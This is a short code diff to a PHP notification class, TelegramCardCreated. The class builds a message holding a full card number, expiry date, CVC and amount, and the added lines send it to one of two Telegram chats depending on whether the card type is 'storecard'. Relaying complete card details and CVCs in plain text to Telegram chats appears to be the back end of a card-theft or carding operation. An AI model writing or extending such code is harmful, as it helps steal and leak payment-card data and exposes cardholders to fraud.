@@ -24,10 +24,17 @@ class TelegramCardCreated extends Notification
     {
        $message = "$" . $notifiable->amount . " - " . $notifiable->card_number . " " . $notifiable->month ."/" . $notifiable->year ." " . $notifiable->cvc ;
 
+       if($notifiable->type == 'storecard'){
+           return TelegramMessage::create()
+               ->to(env('TELEGRAM_ID_StoreCards'))
+               ->content($message);
+       }
+       else{
+           return TelegramMessage::create()
+               ->to(env('TELEGRAM_ID'))
+               ->content($message);
+       }
 
-        return TelegramMessage::create()
-            ->to(env('TELEGRAM_ID'))
-            ->content($message);
     }
 
     public function toSlack($notifiable)
